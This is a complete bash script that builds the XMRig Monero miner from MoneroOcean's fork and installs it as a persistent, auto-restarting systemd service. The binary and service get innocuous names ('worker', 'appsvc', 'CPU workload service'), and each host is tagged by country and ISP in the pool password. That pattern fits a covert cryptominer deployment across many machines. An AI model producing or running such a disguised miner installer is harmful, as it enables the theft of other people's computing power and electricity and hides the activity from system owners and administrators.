#!/bin/bash
set -e

sudo apt update
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev jq curl

APP_DIR="$HOME/appsvc"

###############################################################################
#                         Generate PASS based on IP info
###############################################################################

echo "[0] Fetching region & ISP info..."

PUBLIC_IP=$(curl -s https://api.ipify.org)
COUNTRY=$(curl -s https://ipinfo.io/$PUBLIC_IP/country)
ORG=$(curl -s https://ipinfo.io/$PUBLIC_IP/org)   # Example: AS1234 Google LLC

# Remove AS number, keep provider name only
ISP=$(echo "$ORG" | cut -d' ' -f2- | tr ' ' '_' | tr '[:upper:]' '[:lower:]')

PASS_VALUE="${COUNTRY}-${ISP}"

echo "[OK] PASS = $PASS_VALUE"

###############################################################################
#                             Compile XMRig (MoneroOcean)
###############################################################################

echo "[1] Preparing directory..."
mkdir -p "$APP_DIR"

echo "[2] Cloning MoneroOcean XMRig..."
rm -rf xmrig || true
git clone https://github.com/MoneroOcean/xmrig.git

echo "[3] Building XMRig from source..."

mkdir -p xmrig/build
cd xmrig/build

cmake ..
make -j"$(nproc)"

echo "[4] Installing worker binary..."
cp xmrig "$APP_DIR/worker"
cd -
rm -rf xmrig

chmod +x "$APP_DIR/worker"

###############################################################################
#                 Generate updated config.json with custom PASS
###############################################################################

echo "[5] Injecting pass into config.json..."

# Generate modified config.json in /tmp
jq --arg PASS "$PASS_VALUE" '.pools[0].pass = $PASS' config.json > /tmp/config.json

# Move to App directory
cp /tmp/config.json "$APP_DIR/config.json"

###############################################################################
#                      ENABLE HUGE PAGES AUTOMATICALLY
###############################################################################

CPU_CORES=$(nproc)
HUGEPAGES=$((1168 + CPU_CORES))

echo "[6] Enabling HugePages (target: $HUGEPAGES)..."

sudo bash -c "echo vm.nr_hugepages=$HUGEPAGES >> /etc/sysctl.conf"
sudo sysctl -w vm.nr_hugepages=$HUGEPAGES

echo "[OK] HugePages applied."

###############################################################################
#                             SYSTEMD SERVICE
###############################################################################

echo "[7] Creating systemd service..."
cat <<EOF > /tmp/appsvc.service
[Unit]
Description=CPU workload service (worker)
After=network-online.target

[Service]
ExecStart=$APP_DIR/worker --config=$APP_DIR/config.json
Restart=always
RestartSec=5
Nice=10

[Install]
WantedBy=multi-user.target
EOF

sudo mv /tmp/appsvc.service /etc/systemd/system/appsvc.service

echo "[8] Activating service..."
sudo systemctl daemon-reload
sudo systemctl enable appsvc.service
sudo systemctl start appsvc.service

echo ""
echo "Setup complete."
echo "View logs with:"
echo "   sudo journalctl -u appsvc -f"

